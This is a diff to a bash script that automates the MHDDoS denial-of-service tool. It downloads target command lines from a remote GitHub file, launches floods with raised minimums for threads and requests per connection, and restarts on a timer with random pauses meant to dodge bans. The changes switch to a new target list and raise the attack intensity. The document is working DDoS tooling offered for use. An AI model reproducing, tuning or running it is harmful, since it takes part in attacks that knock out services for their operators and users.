@@ -1,6 +1,6 @@
 #!/bin/bash
 
-restart_interval=10m
+restart_interval=13m
 
 
 
@@ -19,24 +19,22 @@ proxy_interval="-p $proxy_interval"
 
 num_of_copies="${1:-1}"
 threads="${2:-500}"
-if ((threads < 100));
+if ((threads < 200));
 then
-	threads=100
+	threads=200
 fi
 
 rpc="${3:-100}"
-if ((rpc < 20));
+if ((rpc < 50));
 then
-	rpc=20
+	rpc=50
 fi
 
 debug="${4:-}"
 if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
 then
-	echo -e "\033[0;31m\n\ndebug in if: $debug\n\n\033[0;0m"
 	debug="--debug"
 fi
-echo -e "\n\ndebug: $debug\n\n"
 
 
 
@@ -70,10 +68,8 @@ do
 	#
    	
 	
-	echo -e "\n\ndebug: $debug\n\n"
-	
    	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
+   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_alexnest/main/runner_targets_new | cat | grep "^[^#]" | wc -l)
 	
 	echo -e "\nNumber of targets in list: " $list_size "\n"
    	echo -e "\nTaking random targets (just not all) to reduce the load on your CPU(processor)..."
@@ -109,7 +105,7 @@ do
    	do
             echo -e "\n I = $i"
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_alexnest/main/runner_targets_new | cat | grep "^[^#]")")
            
 
             echo -e "\nfull cmd:\n"
@@ -121,7 +117,7 @@ do
             echo -e "\n\033[42mAttack started successfully\033[0m\n"
    	done
 	echo -e "\033[0;34m#####################################\033[0;0m\n"
-   	echo -e "\n\033[1;35mDDoS is up and Running, next update of targets list in $restart_interval\033[1;0m"
+   	echo -e "\n\033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
    	sleep $restart_interval
 	clear
    	
@@ -132,7 +128,7 @@ do
    	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
    	no_ddos_sleep="$(shuf -i 4-12 -n 1)m"
-   	echo -e "\n\033[46mSleeping $no_ddos_sleep to protect your machine from ban...\033[0m\n"
+   	echo -e "\n\033[46mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
 	sleep $no_ddos_sleep
 	echo -e "\n\033[42mRESTARTING\033[0m\n"
 	
